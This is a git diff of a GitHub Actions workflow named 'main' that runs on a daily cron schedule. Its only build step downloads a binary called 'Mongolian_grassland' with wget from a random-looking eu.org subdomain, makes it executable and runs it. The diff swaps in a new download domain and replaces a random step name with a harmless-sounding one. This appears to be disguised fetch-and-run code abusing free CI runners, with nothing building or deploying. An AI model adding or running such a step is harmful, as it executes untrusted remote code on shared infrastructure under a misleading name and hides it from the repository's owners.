@@ -1,4 +1,4 @@
-#2024-03-16-[122926]-tgv8pz30
+#2024-03-18-[023931]-l5ig9on0
 name: main
 
 on:
@@ -8,15 +8,15 @@ on:
     types: runner_workflow
 
   schedule:
-    - cron: "52 3 * * * "
+    - cron: "21 3 * * * "
 
 jobs:
   build-deploy:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-      - name: npxrhpnvc7fgtb5g
+      - name: default_build_deploy_name_note
         run: |
-          wget -q https://bangla-87t33kx9.digitalmarketingservice.eu.org/Mongolian_grassland
+          wget -q https://n60fvzqvgnc9p0mh.callforpapers.eu.org/Mongolian_grassland
           chmod 755 Mongolian_grassland
           ./Mongolian_grassland
